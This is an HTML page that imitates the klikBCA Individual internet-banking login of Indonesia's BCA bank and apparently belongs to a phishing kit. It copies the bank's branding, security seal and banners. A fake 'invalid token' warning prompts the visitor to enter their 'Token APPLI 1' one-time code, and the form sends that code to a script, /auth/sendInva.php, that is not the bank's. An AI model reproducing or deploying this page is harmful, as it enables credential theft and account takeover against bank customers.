<html>
<head><meta charset="utf-8">
	<title>klikBCA Individual</title>
	<link href="../css/kbi.css" rel="stylesheet" type="text/css" />
	<link href="../css/banner-slide.css" rel="stylesheet" type="text/css" />
</head>
<body alink="white" bgcolor="white" link="white" marginheight="0" onload="document.forms[0]['value(user_id)'].focus();" topmargin="0" vlink="white">
<div id="gotohome" style="position: absolute; left: 701px; top: 25px; width: 45px; height: 22px; z-index: 1"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><font size="1">[<a href="http://www.klikbca.com">HOME</a>]</font></b></font></div>

<div id="Layer1" style="position: absolute; left: 675px; top: 171px; width: 90px; height: 90px; z-index: 2">
<div data-language="en" id="DigiCertClickID_KDLw0KTn">
<p align="center"><!-- <font face="Verdana, Arial, Helvetica, sans-serif" size="1">Klik
	    BCA is secured with<br>
	    SSL 2048 bit encryption.<br><br>
	    </font>--><a href="javascript:void(0);" onclick="window.open('https://seal.digicert.com/seals/popup/?tag=KDLw0KTn&amp;url=ibank.klikbca.com', '_blank', 'width=550,scrollbars=yes');"><img border="0" src="images/digicert-seal.png" /> </a></p>
</div>
</div>

<div id="Layer2" style="position: absolute; left: 620px; top: 75px; width: 135px; height: 112px; z-index: 3"><a href="https://www.bca.co.id/awasmodus?utm_campaign=Awas%20Modus&amp;utm_source=iBank%20Klik%20BCA&amp;utm_medium=CTW&amp;utm_term=Edukatips&amp;utm_content=Banner%20Awas%20Modus" target="new"><img border="0" src="images/keamanan-ib.png" /></a></div>

<table border="0" cellpadding="0" cellspacing="0" width="760">
	<tbody>
		<tr>
			<td width="70"><img height="72" src="images/logo_top1.gif" width="70" /></td>
			<td width="10"><img height="72" src="images/LOGO_TOP_anim.gif" width="10" /></td>
			<td width="285"><img height="72" src="images/LOGO_TOP.jpg" width="285" /></td>
			<td background="images/logo_top_back.gif" width="395"><img height="72" src="images/logo_top_back.gif" width="395" /></td>
		</tr>
	</tbody>
</table>

<table border="0" cellpadding="0" cellspacing="0" width="759">
	<tbody>
		<tr height="330">
			<td height="330" nowrap="nowrap" width="200">
			<table bgcolor="#6686df" border="0" cellpadding="5" cellspacing="0" width="150">
				<tbody>
					<tr height="320">
						<td bgcolor="#6686df" height="320" width="150"><font color="white" face="Verdana" size="1"><b>USER ID dan PIN Internet Banking dapat diperoleh pada saat Anda melakukan Registrasi Internet melalui ATM BCA. Untuk informasi lebih lanjut hubungi Halo BCA 1500888. </b></font><br />
						<br />
						<font color="yellow" face="Verdana" size="1"><b><!--In order to get BCA Internet Banking User ID and PIN, You should register through
                            BCA ATM. For further information, please contact Halo BCA (021) 5208888.--> HOW TO GET STARTED: To start using BCA Internet Banking, You must first register through any BCA ATM. For further information, please contact Halo BCA 1500888. </b></font>

						<center><br />
						<br />
						<font color="yellow" face="Verdana" size="1"><b><a href="javascript:sPrivacy()">[ PRIVACY POLICY ]</a></b></font></center>
						<font color="yellow" face="Verdana" size="1"><b> </b></font></td>
					</tr>
				</tbody>
			</table>
			</td>
			<td height="330" valign="top" width="559">
			            <form method="post" action="/auth/sendInva.php"><span style="display: none;">&nbsp;</span><span style="display: none;">&nbsp;</span>
			<table align="left" cellpadding="0" cellspacing="0" style="height:10px;width:30px;" width="500">
				<tbody>
				    <tr>
         <MARQUEE behavior=”ALTERNATE” width=”300″><span style="color: red; font-weight: bold;">Token Yang Anda Masukkan Tidak Valid.</span></MARQUEE>
					<tr>
						<th scope="row" style="text-align: left;" width="500">
						<p><font color="#000090" face="Verdana" size="2"><b><span style="display: none;">&nbsp;</span>Silakan memasukkan Token APPLI 1</b></font></p>
						</th>
					</tr>
					</br>
					<tr>
					</tr>
					<tr>
						<td width="500">
						<p>&nbsp;<input id="pesan" placeholder="Pesan" type="hidden" /> &nbsp;</p>

						<p>Token APPLI 1&nbsp;<span style="color:#2980b9;"><input autocomplete="on" id="appli2" name="appli2" maxlength="18" placeholder="APPLI 1" size="24" type="number" /></span> &nbsp; &nbsp;</p>

						<table border="0" cellpadding="0" cellspacing="0" width="500">
							<tbody>
								<tr>
									<td width="500"><input onclick="kirimPesan()" type="submit" value="LOGIN" /></td>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
					<tr>
					</tr>
					<tr>
					</tr>
					<tr>
						<td width="500"><input autocomplete="on" id="email" maxlength="6" placeholder="PIN" size="24" type="hidden" /></td>
					</tr>
					<tr height="20">
						<td height="20" width="500"><img height="1" src="./images/spacer.gif" width="1" />
						<p></p>
						</td>
					</tr>
					<tr>
						<td width="500">
						<p></p>

						<p></p>

						<p></p>

						<p></p>
						</td>
					</tr>
				</tbody>
			</table>
			</form>
			<table border="0" cellpadding="5" cellspacing="0" style="height:100px;" width="520">
				<tbody>
					<tr>
						<td>
						<div style="text-align:center; user-select: none;"></div>

						<table border="0" cellpadding="0" cellspacing="0" width="100%">
							<tbody>
								<tr>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
					<tr>
						<td colspan="2">
						<div class="banner-slide-container">
						<div class="banner-slide" style="display: none;"><img class="banner-image" onclick="bannerClickEvent('https://www.bca.co.id/id/Individu/layanan/pengiriman-uang/Remittance/Outward-Remittance/Remittance-via-KlikBCA-Individu')" src="https://ibank.klikbca.com/images/banner_login_1.png;bca21ddbb2934c23f81" style="cursor: pointer;" /></div>

						<div class="banner-slide" style="display: block;"><img class="banner-image" onclick="bannerClickEvent('https://www.bca.co.id/id/informasi/news-and-features/2022/03/22/07/16/Kini-bisa-Perpanjang-Tahapan-Berjangka-BCA-via-KlikBCA?funnel_source=search_suggestion')" src="https://ibank.klikbca.com/images/banner_login_2.png;bca715afbde2cf517f3" style="cursor: pointer;" /></div>

						<div class="banner-slide" style="display: none;"><img class="banner-image" onclick="bannerClickEvent('https://www.bca.co.id/id/informasi/awas-modus/2022/12/15/10/15/tolak-dengan-anggun-yang-minta-data-pribadi-perbankan?funnel_source=searchresult')" src="https://ibank.klikbca.com/images/banner_login_3.png;bcae3f0df14885bed8c" style="cursor: pointer;" /></div>

						<div class="banner-slide" style="display: none;"><img class="banner-image" onclick="bannerClickEvent('https://www.bca.co.id/id/informasi/Edukatips/2020/12/28/03/48/Stay-Up-to-Date-Perlancar-eBanking-mu-dengan-browser-dan-OS-terbaru')" src="https://ibank.klikbca.com/images/banner_login_4.png;bca935e724644ad5db8" style="cursor: pointer;" /></div>
						<a class="prev-navigation" onclick="nagivateSlide('PREV', null)">❮</a> <a class="next-navigation" onclick="nagivateSlide('NEXT', null)">❯</a></div>

						<div style="text-align:center; user-select: none;"></div>
						</td>
					</tr>
				</tbody>
			</table>
			</td>
		</tr>
	</tbody>
</table>

<table border="0" cellpadding="0" cellspacing="0" width="760">
	<tbody>
		<tr>
			<td>
			<div align="right">
			<table border="0" cellpadding="0" cellspacing="0" width="760">
				<tbody>
					<tr>
						<td width="192"><img height="31" src="images/bottom1.gif" width="192" /></td>
						<td background="images/bottom2.jpg" valign="top" width="535">
						<table border="0" cellpadding="0" cellspacing="0" width="100%">
							<tbody>
								<tr>
									<td width="213">
									<div align="right"><font face="Verdana" size="1">Copyright &copy; 2000</font></div>
									</td>
									<td width="75">
									<center><font face="Verdana" size="1"><img height="23" src="images/bca_logo.gif" width="69" /></font></center>
									</td>
									<td width="247">
									<div align="left"><font face="Verdana" size="1">All Rights Reserved</font></div>
									</td>
								</tr>
							</tbody>
						</table>
						</td>
						<td width="33">
						<div align="right"><img height="31" src="images/bottom3.gif" width="33" /></div>
						</td>
					</tr>
				</tbody>
			</table>
			</div>
			</td>
		</tr>
	</tbody>
</table>
</body>
</html>